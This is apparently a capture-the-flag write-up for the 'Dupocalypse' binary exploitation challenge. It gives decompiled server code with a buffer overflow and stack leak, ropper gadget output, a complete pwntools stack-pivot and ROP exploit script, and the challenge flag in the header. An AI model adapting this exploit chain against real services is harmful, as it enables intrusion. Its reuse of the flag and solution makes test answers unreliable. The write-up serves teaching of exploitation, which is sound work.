---
title: Dupocalypse
category: Binary Exploitation
tags: 
completedDuringEvent: true
submitted: true
flag: p_ctf{dup0calyps3_unl34sh3d_st4ck_m4nip_0verfl0w_r3b00t3d}
draft: false
---
Let's just decompile the binary using **IDA Pro**.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int optval; // [rsp+18h] [rbp-48h] BYREF
  socklen_t addr_len; // [rsp+1Ch] [rbp-44h] BYREF
  struct sockaddr addr; // [rsp+20h] [rbp-40h] BYREF
  struct sockaddr s; // [rsp+30h] [rbp-30h] BYREF
  int v8; // [rsp+4Ch] [rbp-14h]
  int fd; // [rsp+50h] [rbp-10h]
  unsigned int v10; // [rsp+54h] [rbp-Ch]
  char *nptr; // [rsp+58h] [rbp-8h]

  nptr = getenv("PORT");
  if ( !nptr )
    exit(1);
  v10 = atoi(nptr);
  addr_len = 16;
  fd = socket(2, 1, 0);
  if ( fd < 0 )
    error("Socket creation failed");
  optval = 1;
  if ( setsockopt(fd, 1, 2, &optval, 4u) < 0 )
    error("Setsockopt failed");
  memset(&s, 0, sizeof(s));
  s.sa_family = 2;
  *(_DWORD *)&s.sa_data[2] = 0;
  *(_WORD *)s.sa_data = htons(v10);
  if ( bind(fd, &s, 0x10u) < 0 )
    error("Bind failed");
  if ( listen(fd, 1) < 0 )
    error("Listen failed");
  printf("Server is listening on port %d...\n", v10);
  v8 = accept(fd, &addr, &addr_len);
  if ( v8 < 0 )
    error("Accept failed");
  write(1, "Accepted a connection...\n", 0x1AuLL);
  getinput((unsigned int)v8);
  close(fd);
  close(v8);
  write(1, "Server shut down.\n", 0x12uLL);
  return 0;
}
```

It can be seen here that this binary is a server that accepts connections on the port defined in the `PORT` environment variable. This binary will accept input from the client and then close the connection.

```c
__int64 __fastcall getinput(unsigned int a1)
{
  char s[256]; // [rsp+10h] [rbp-100h] BYREF

  write(a1, &unk_400F08, 0x27uLL);
  whereami(s, a1);
  memset(s, 0, sizeof(s));
  write(a1, &unk_400F30, 0x2DuLL);
  read(a1, s, 0x118uLL);                        // Buffer Overflow
  write(a1, &unk_400F60, 0x25uLL);
  return 0LL;
}
```

And yep another classic buffer overflow. This binary receives input from the client of 0x118 (280) bytes into the 256 byte buffer `s`. We are only given 24 bytes to perform the buffer overflow.

```c
ssize_t __fastcall whereami(const void *a1, int a2)
{
  char s[60]; // [rsp+10h] [rbp-40h] BYREF
  int v4; // [rsp+4Ch] [rbp-4h]

  v4 = snprintf(s, 0x3CuLL, "The stack has spoken:%p\nThe rest is up to you!\n", a1);
  return write(a2, s, v4);
}
```

But there is something interesting here where the `whereami` function will write the stack address to the client. We can use this stack address to do [Stack Pivoting](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting/exploitation/leave) and do ROP. (Also someone solved this using **ret2csu**).

```c
void __fastcall pwn(__int64 a1, __int64 a2, int a3)
{
  size_t v3; // rax
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  FILE *stream; // [rsp+78h] [rbp-8h]

  if ( a3 == 0xCAFEBABE )
  {
    stream = fopen("app/flag.txt", "r");
    if ( stream )
    {
      fgets(s, 100, stream);
      v3 = strlen(s);
      write(1, s, v3);
      fclose(stream);
    }
    else
    {
      write(1, "Contact admin\n", 0xEuLL);
    }
  }
}
```

What is interesting here is that this binary has a `pwn` function which will open the `app/flag.txt` file and write the contents of the file to file descriptor 1 (stdout) but will not write to the client 4 file descriptor.

```c
int dupx()
{
  return dup2(1, 1);
}
```

Ok there is a function `dup2` which will duplicate the old file descriptor to the new file descriptor. We can use this to write flags to the client.

Since there is a condition to check whether arguments 3 is `0xCAFEBABE` and there is no gadget for rdx then we can't call the function from the beginning line but there is an address adjustment and call after the check.

![alt text](image.png)

We can use the address `0x400AC1` to call the `pwn` function without having to go through the check.

To find the gadget we need we can use `ropper`.

```sh
$ ropper --file challenge/chal --search "leave; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: leave; ret

[INFO] File: challenge/chal
0x0000000000400b39: leave; ret;

$ ropper --file challenge/chal --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: challenge/chal
0x0000000000400e93: pop rdi; ret; 

$ ropper --file challenge/chal --search "pop rsi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: challenge/chal
0x0000000000400e91: pop rsi; pop r15; ret;
```

We can use the `leave; ret` gadget to perform stack pivoting and the `pop rdi` and `pop rsi; pop r15; ret` gadgets to perform ROP.

```py
from pwn import *

binary = './challenge/chal'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = remote('127.0.0.1', 1337)
# r = remote('dupocalypse.ctf.prgy.in', 1337, ssl=True)

r.recvuntil(b"The stack has spoken:")
leaked_stack = int(r.recvline().strip(), 16)
log.info(f"Leaked stack address: {hex(leaked_stack)}")

leave_ret = 0x400b39

pop_rdi = 0x400e93 
pop_rsi_r15 = 0x400e91

payload = flat(
                            # pop rbp (leave)
    leaked_stack,           # New RBP

    # Redirect stdout to client
    pop_rdi,                # pop rdi; ret (Argument 1)
    4,                      # Socket fd
    pop_rsi_r15,            # pop rsi; pop r15; ret (Argument 2)
    1,                      # Because the flag is in the stdout
    0x0,
    p64(e.symbols['dup2']),

    # Open flag.txt
    pop_rdi,
    0x0,                    # useless
    pop_rsi_r15,
    0x0,                    # useless
    0x0,
    p64(0x400AC1)
)

payload = payload.ljust(256, b'A')
payload += flat([
    leaked_stack,
    leave_ret,
])

r.recvuntil(b"your input?\n")
r.send(payload)

r.interactive()
```
